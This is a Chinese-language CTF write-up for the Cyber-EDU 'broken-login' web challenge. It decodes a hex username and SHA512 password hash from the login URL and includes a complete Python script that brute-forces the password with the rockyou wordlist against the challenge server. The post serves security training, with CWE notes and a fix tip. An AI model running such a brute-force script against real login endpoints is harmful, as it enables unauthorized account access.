---
title: ( Cyber-EDU ) broken-login
published: 2024-08-08
description: ''
image: ''
tags: [Writeup, CTF, Web]
category: 'WriteUps'
draft: false 
---

# broken-login ( Write Up )

[broken-login](https://app.cyber-edu.co/challenges/62bee6e0-356c-11eb-a033-199a06b529d6?tenant=cyberedu)

## 🔻 Step 1. 觀察與測試

1. 網頁中有一個表單，包含兩個輸入值 "name" 和 "password"。

2. 分別隨意輸入 `admin` 和 `123` 會發現網站導向 `/auth?username=61646d696e&password=3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2` 。

3. 透過工具發現其中的 `61646d696e` 和 `3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2` 分別為 Hex 格式與 SHA512 加密。

4. 網頁始終呈現空的內容 -> 可能導向錯的網址或是傳送錯的資料

## 🔻 Step 2. 修改與嘗試

1. 嘗試將 params 中的 `username=` 改為 `name=`，即 `/auth?name=61646d696e&password=3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2`，網頁回報 "Invalid user"。

2. 藉由題目的提示，猜測 user 為 Alex，並將其轉換成 Hex 格式，得 `416c6578`。代入 `name` 後，網頁回報 "Invalid password"。
（若題目沒有提示，可能需要 Brute Force）

## 🔻 Step 3. 爆破攻擊

1. 在網路上找到 rockyou.txt 的 wordlist，使用 Python 撰寫 Brute Force 工具。
2. 程式碼如下：
```python=
import aiohttp
import hashlib
import asyncio

async def main():
    # 載入 rockyou.txt 檔案
    with open("rockyou.txt", 'rb') as file: 
        # 逐行讀取資料，並迴圈代入 p
        for p in file.readlines(): 
            # 將讀取出的 p 值利用 SHA512 加密
            password = hashlib.sha512(p.strip()).hexdigest()
            print(password)
            # 利用 aiohttp 套件非同步傳送請求
            async with aiohttp.request("GET", "http://34.159.104.59:32528/auth?name=416c6578&password=" + password) as r: 
                assert r.status == 200
                # 讀取網頁 output 的資訊
                rtext = await r.text()
                # 如果網頁 output 的內容不包含 "Invalid"，則停止迴圈
                if 'Invalid' not in rtext:
                    print(p, rtext)
                    break
                print(p, rtext)

# 利用 asyncio 非同步執行程式
asyncio.run(main())
```

3. 爆破完以後，取得 Flag。

## CWE 資訊

CWE-1390: Weak Authentication
CWE-521: Weak Password Requirements
CWE-1391: Use of Weak Credentials

## 漏洞修補建議

- 改用不易被破解的強密碼與使用者名稱

## 總結

若不參考提示，本題會使用到兩次 Brute Force 猜測使用者名稱與密碼，以及必須熟悉編碼與加密形式，除了需要尋找 wordlist 外，還需要自行編寫異步程式來爆破。